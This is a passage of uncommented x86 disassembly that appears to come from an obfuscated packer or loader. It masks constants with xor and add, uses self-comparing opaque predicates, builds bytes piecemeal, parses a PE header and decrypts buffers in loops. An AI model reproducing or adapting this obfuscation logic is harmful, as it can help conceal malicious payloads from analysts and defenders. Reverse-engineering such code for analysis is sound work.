  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
